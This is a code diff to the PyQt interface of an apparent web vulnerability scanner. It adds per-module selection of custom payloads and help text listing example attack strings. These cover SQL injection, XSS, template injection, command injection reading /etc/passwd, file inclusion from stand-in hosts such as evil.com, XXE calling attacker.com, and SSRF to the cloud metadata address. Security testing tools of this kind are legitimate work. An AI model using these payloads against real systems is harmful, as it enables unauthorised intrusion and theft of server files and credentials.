@@ -811,10 +811,70 @@ class DominatorGUI(QMainWindow):
         layout = QVBoxLayout(widget)
 
         # Instructions
-        info_label = QLabel("💡 Provide custom payloads to override default payloads. You can enter payloads directly or load from a file.")
+        info_label = QLabel("💡 Provide custom payloads to override default payloads for specific modules. Select target module(s) below.")
         info_label.setStyleSheet("color: #00ff88; padding: 10px; background-color: #2a2a2a; border-radius: 5px;")
         info_label.setWordWrap(True)
         layout.addWidget(info_label)
+
+        # Module Selection for Custom Payloads
+        module_select_group = QGroupBox("🎯 Target Module(s)")
+        module_select_layout = QVBoxLayout()
+
+        module_help = QLabel("Select which module(s) should use these custom payloads:")
+        module_help.setStyleSheet("color: #888888; font-size: 10px;")
+        module_select_layout.addWidget(module_help)
+
+        # Module selector dropdown
+        module_selector_layout = QHBoxLayout()
+        module_selector_layout.addWidget(QLabel("Apply payloads to:"))
+
+        self.payload_target_module = QComboBox()
+        self.payload_target_module.addItems([
+            "All Modules",
+            "SQL Injection (sqli)",
+            "Cross-Site Scripting (xss)",
+            "Server-Side Template Injection (ssti)",
+            "Command Injection (cmdi)",
+            "LDAP Injection (ldap)",
+            "XPath Injection (xpath)",
+            "Local File Inclusion (lfi)",
+            "Remote File Inclusion (rfi)",
+            "XML External Entity (xxe)",
+            "Server-Side Request Forgery (ssrf)",
+            "PHP Object Injection (php_object_injection)"
+        ])
+        self.payload_target_module.setStyleSheet("""
+            QComboBox {
+                background-color: #2a2a2a;
+                color: white;
+                border: 2px solid #3a3a3a;
+                border-radius: 4px;
+                padding: 6px;
+                min-width: 300px;
+            }
+            QComboBox::drop-down {
+                border: none;
+                background-color: #3a3a3a;
+            }
+            QComboBox::down-arrow {
+                image: none;
+                border-left: 5px solid transparent;
+                border-right: 5px solid transparent;
+                border-top: 5px solid white;
+            }
+            QComboBox QAbstractItemView {
+                background-color: #2a2a2a;
+                color: white;
+                selection-background-color: #00ff88;
+                selection-color: black;
+            }
+        """)
+        module_selector_layout.addWidget(self.payload_target_module)
+        module_selector_layout.addStretch()
+
+        module_select_layout.addLayout(module_selector_layout)
+        module_select_group.setLayout(module_select_layout)
+        layout.addWidget(module_select_group)
 
         # Custom Payloads File
         file_group = QGroupBox("📁 Load Payloads from File")
@@ -836,25 +896,30 @@ class DominatorGUI(QMainWindow):
         direct_group = QGroupBox("✍️ Enter Payloads Directly")
         direct_layout = QVBoxLayout()
 
-        help_text = QLabel("Enter custom payloads below (one per line). These will override default payloads for selected modules.")
+        help_text = QLabel("Enter custom payloads below (one per line). These will ONLY be used by the selected module above.")
         help_text.setStyleSheet("color: #888888; font-size: 10px;")
         help_text.setWordWrap(True)
         direct_layout.addWidget(help_text)
 
+        # Dynamic help based on selected module
+        self.payload_example_label = QLabel()
+        self.payload_example_label.setStyleSheet("color: #00ff88; font-size: 10px; padding: 5px; background-color: #1a1a1a; border-radius: 3px;")
+        self.payload_example_label.setWordWrap(True)
+        direct_layout.addWidget(self.payload_example_label)
+
+        # Connect to update examples when module changes
+        self.payload_target_module.currentTextChanged.connect(self.update_payload_examples)
+
         self.custom_payloads_text = QTextEdit()
         self.custom_payloads_text.setPlaceholderText(
-            "Example XSS payloads:\n"
-            "<script>alert('XSS')</script>\n"
-            "<img src=x onerror=alert(1)>\n"
-            "'\"><script>alert(document.domain)</script>\n\n"
-            "Example SQLi payloads:\n"
-            "' OR 1=1--\n"
-            "admin' --\n"
-            "1' UNION SELECT NULL,NULL--\n\n"
-            "Example SSTI payloads:\n"
-            "{{7*7}}\n"
-            "${7*7}\n"
-            "{{config}}"
+            "Select a target module above to see example payloads...\n\n"
+            "Your custom payloads will be used INSTEAD of the default payloads\n"
+            "for the selected module during the scan.\n\n"
+            "Examples:\n"
+            "• SQL Injection: ' OR 1=1--, admin' --\n"
+            "• XSS: <script>alert(1)</script>, <img src=x onerror=alert(1)>\n"
+            "• SSTI: {{7*7}}, ${7*7}, {{config}}\n"
+            "• Command Injection: ;whoami, `whoami`, $(whoami)"
         )
         self.custom_payloads_text.setMinimumHeight(300)
         self.custom_payloads_text.setStyleSheet("""
@@ -918,6 +983,9 @@ class DominatorGUI(QMainWindow):
 
         direct_group.setLayout(direct_layout)
         layout.addWidget(direct_group)
+
+        # Initialize with default examples
+        self.update_payload_examples("All Modules")
 
         layout.addStretch()
         return widget
@@ -1396,6 +1464,26 @@ class DominatorGUI(QMainWindow):
         lines = [line.strip() for line in text.split('\n') if line.strip()]
         count = len(lines)
         self.payload_count_label.setText(f"Payloads: {count}")
+
+    def update_payload_examples(self, module_text):
+        """Update payload examples based on selected module"""
+        examples = {
+            "All Modules": "ℹ️ Payloads will be applied to ALL compatible modules. Use specific module selection for better control.",
+            "SQL Injection (sqli)": "💡 SQL Injection Examples:\n' OR 1=1--\nadmin' --\n1' UNION SELECT NULL,NULL,NULL--\n' AND '1'='1\n1 OR 1=1",
+            "Cross-Site Scripting (xss)": "💡 XSS Examples:\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n'\"><script>alert(document.domain)</script>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
+            "Server-Side Template Injection (ssti)": "💡 SSTI Examples:\n{{7*7}}\n${7*7}\n{{config}}\n{{config.items()}}\n{{''.class.mro()[1].subclasses()}}",
+            "Command Injection (cmdi)": "💡 Command Injection Examples:\n;whoami\n`whoami`\n$(whoami)\n| whoami\n& whoami\n;cat /etc/passwd",
+            "LDAP Injection (ldap)": "💡 LDAP Injection Examples:\n*)(uid=*))(|(uid=*\nadmin*\n*)(|(password=*\n)(cn=*))(|(cn=*",
+            "XPath Injection (xpath)": "💡 XPath Injection Examples:\n' or '1'='1\n' or 1=1 or ''='\n//*\nx' or name()='username' or 'x'='y",
+            "Local File Inclusion (lfi)": "💡 LFI Examples:\n../../../etc/passwd\n....//....//....//etc/passwd\n/etc/passwd\nphp://filter/convert.base64-encode/resource=index.php",
+            "Remote File Inclusion (rfi)": "💡 RFI Examples:\nhttp://evil.com/shell.txt\nhttps://attacker.com/backdoor.php\nftp://malicious.com/payload.txt",
+            "XML External Entity (xxe)": "💡 XXE Examples:\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">\n<!ENTITY % xxe SYSTEM \"file:///etc/hostname\">",
+            "Server-Side Request Forgery (ssrf)": "💡 SSRF Examples:\nhttp://127.0.0.1\nhttp://localhost\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]",
+            "PHP Object Injection (php_object_injection)": "💡 PHP Object Injection Examples:\nO:8:\"stdClass\":0:{}\nO:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}\na:2:{i:0;s:4:\"test\";i:1;s:5:\"admin\";}"
+        }
+
+        example_text = examples.get(module_text, "Select a module to see specific payload examples.")
+        self.payload_example_label.setText(example_text)
 
     def save_payloads_to_file(self):
         """Save custom payloads to a file"""
